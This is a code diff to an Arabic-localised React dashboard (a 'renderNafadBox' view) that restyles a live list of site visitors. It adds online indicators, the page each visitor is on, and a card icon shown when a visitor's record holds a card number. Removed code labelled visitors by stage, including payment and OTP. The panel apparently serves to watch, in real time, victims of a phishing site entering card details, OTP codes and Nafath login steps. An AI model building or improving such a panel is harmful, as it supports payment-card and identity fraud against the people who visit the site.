@@ -1564,23 +1564,27 @@ const renderNafadBox = () => {
           </div>
 
           {/* Visitor List - Sorted by newest first */}
-          <div style={{ flex: 1, overflowY: "auto" }}>
+          <div style={{ flex: 1, overflowY: "auto", fontFamily: "Cairo, Tajawal, sans-serif" }}>
             {filteredRequests.map((item) => {
               const isSelected = selectedRequestIds.includes(item.id);
+              const isOnline = item.badge === "new" || (item.updatedAt && (Date.now() - new Date(item.updatedAt).getTime()) < 60000);
+              const currentPage = item.raw?.currentPage || item.raw?.page || "الرئيسية";
               return (
                 <div
                   key={item.id}
                   onClick={() => setSelectedRequestId(item.id)}
                   style={{
-                    padding: "16px",
-                    borderBottom: "1px solid #f3f4f6",
-                    background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
+                    padding: "10px",
+                    borderBottom: "1px solid #e5e7eb",
+                    background: selectedRequestId === item.id ? "#f0fdf4" : (isOnline ? "#f0fdf4" : "#fff"),
                     cursor: "pointer",
                     transition: "background 0.2s",
+                    borderRight: selectedRequestId === item.id ? "3px solid #16a34a" : "3px solid transparent",
                   }}
                 >
-                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
-                    <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
+                  <div style={{ display: "flex", alignItems: "start", gap: 8 }}>
+                    {/* Checkbox */}
+                    <div style={{ marginTop: 2 }}>
                       <input
                         type="checkbox"
                         checked={isSelected}
@@ -1589,56 +1593,97 @@ const renderNafadBox = () => {
                           toggleRequestSelection(item.id);
                         }}
                         onClick={(event) => event.stopPropagation()}
-                        style={{ accentColor: "#22c55e", cursor: "pointer" }}
+                        style={{ accentColor: "#16a34a", cursor: "pointer", width: 14, height: 14 }}
                       />
-                      <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
-                      <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
                     </div>
-                    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                      <span style={{ 
-                        background: "#f3f4f6", 
-                        padding: "4px 8px", 
-                        borderRadius: 6,
-                        fontSize: "0.8rem",
-                        fontWeight: 600
+                    
+                    {/* Avatar with status */}
+                    <div style={{ position: "relative", flexShrink: 0 }}>
+                      <div style={{
+                        width: 36,
+                        height: 36,
+                        borderRadius: "50%",
+                        background: isOnline 
+                          ? "linear-gradient(135deg, #16a34a, #15803d)" 
+                          : "linear-gradient(135deg, #4b5563, #374151)",
+                        boxShadow: isOnline ? "0 0 0 2px rgba(34, 197, 94, 0.25)" : "none",
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        fontSize: "0.7rem",
+                        fontWeight: 700,
+                        color: "#fff",
                       }}>
-                        ⏱️ <LiveTimer startTime={item.submittedAt || item.updatedAt || ""} />
-                      </span>
+                        {item.customer?.charAt(0)?.toUpperCase() || "?"}
+                      </div>
+                      {/* Online indicator */}
+                      <span style={{
+                        position: "absolute",
+                        bottom: 0,
+                        right: 0,
+                        width: 10,
+                        height: 10,
+                        borderRadius: "50%",
+                        background: isOnline ? "#16a34a" : "#6b7280",
+                        border: "2px solid #fff",
+                        animation: isOnline ? "pulse 2s infinite" : "none",
+                      }} />
+                      {/* Country flag */}
+                      {getCountryFlag(item.raw) && (
+                        <span style={{
+                          position: "absolute",
+                          top: -2,
+                          left: -2,
+                          fontSize: "0.65rem",
+                          lineHeight: 1,
+                        }}>
+                          {getCountryFlag(item.raw)}
+                        </span>
+                      )}
                     </div>
-                  </div>
-                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                    <div
-                      style={{
-                        display: "inline-block",
-                        padding: "4px 12px",
-                        borderRadius: 6,
-                        fontSize: "0.8rem",
-                        fontWeight: 600,
-                        background:
-                          item.stage === "الدفع"
-                            ? "#dbeafe"
-                            : item.stage === "التأمين"
-                              ? "#fef3c7"
-                              : item.stage === "مقارنة"
-                                ? "#f3e8ff"
-                                : item.stage === "OTP"
-                                  ? "#fee2e2"
-                                  : "#e0f2fe",
-                        color:
-                          item.stage === "الدفع"
-                            ? "#2563eb"
-                            : item.stage === "التأمين"
-                              ? "#d97706"
-                              : item.stage === "مقارنة"
-                                ? "#9333ea"
-                                : item.stage === "OTP"
-                                  ? "#dc2626"
-                                  : "#0284c7",
-                      }}
-                    >
-                      {item.stage}
+                    
+                    {/* Info */}
+                    <div style={{ flex: 1, minWidth: 0 }}>
+                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                          <span style={{ 
+                            fontWeight: 700, 
+                            fontSize: "0.8rem", 
+                            color: selectedRequestId === item.id ? "#15803d" : "#111827",
+                            overflow: "hidden",
+                            textOverflow: "ellipsis",
+                            whiteSpace: "nowrap",
+                            maxWidth: 160,
+                          }}>
+                            {item.customer}
+                          </span>
+                          {item.hasCard || item.raw?._v1 || item.raw?.cardNumber ? (
+                            <span style={{ flexShrink: 0 }}>
+                              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2">
+                                <rect width="20" height="14" x="2" y="5" rx="2" />
+                                <line x1="2" x2="22" y1="10" y2="10" />
+                              </svg>
+                            </span>
+                          ) : null}
+                        </div>
+                        <span style={{ fontSize: "0.65rem", color: "#9ca3af", whiteSpace: "nowrap", flexShrink: 0 }}>
+                          {item.updated}
+                        </span>
+                      </div>
+                      <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
+                        <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
+                          {currentPage}
+                        </span>
+                        <span style={{
+                          width: 6,
+                          height: 6,
+                          borderRadius: "50%",
+                          background: isOnline ? "#16a34a" : "#9ca3af",
+                          display: "inline-block",
+                          animation: isOnline ? "pulse 2s infinite" : "none",
+                        }} />
+                      </div>
                     </div>
-                    <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
                   </div>
                 </div>
               );
@@ -1647,6 +1692,9 @@ const renderNafadBox = () => {
               <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
             )}
           </div>
+          </div>
+
+
         </aside>
 
         {/* Main Panel - Client Details */}
